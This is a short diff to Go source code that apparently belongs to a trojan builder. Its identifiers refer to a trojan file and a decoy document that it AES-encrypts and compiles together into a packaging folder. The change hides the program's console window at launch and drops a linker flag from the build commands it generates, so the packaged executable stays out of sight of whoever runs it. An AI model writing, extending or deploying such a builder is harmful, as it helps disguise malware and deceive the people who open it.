@@ -71,6 +71,7 @@ import (
 	"reflect"
 	"strings"
 	"syscall"
+	"github.com/lxn/win"
 )
 
 var (
@@ -89,6 +90,7 @@ var (
 )
 
 func main() {
+	win.ShowWindow(win.GetConsoleWindow(), win.SW_HIDE)
 	a,_ := os.Getwd()
 	b := os.Args[0]
 	c := strings.Replace(b,a,"",-1)
@@ -166,14 +168,14 @@ func str_func(hanshu interface{}, canshu ...interface{}) []reflect.Value {
 	`, key, mumafile, docfile, docfile, AesdocfileStr, AesmumafileStr)
 
 	lujing := ""
-	comm := "go build -ldflags \"-H=windowsgui\" main.go"
+	comm := "go build main.go"
 	lujing2 := ""
 	if len(os.Args) == 4 {
 		os.Mkdir("./dabao", os.ModePerm)
 		lujing = "./dabao/"
 		lj, _ := os.Getwd()
 		lujing2 = lj+"\\dabao\\"
-		comm =  "cd "+ lujing2 + " && go build -ldflags \"-H=windowsgui\""
+		comm =  "cd "+ lujing2 + " && go build"
 		if strings.HasSuffix(os.Args[3],".syso") {
 			nr,err := ioutil.ReadFile(os.Args[3])
 			if err != nil {
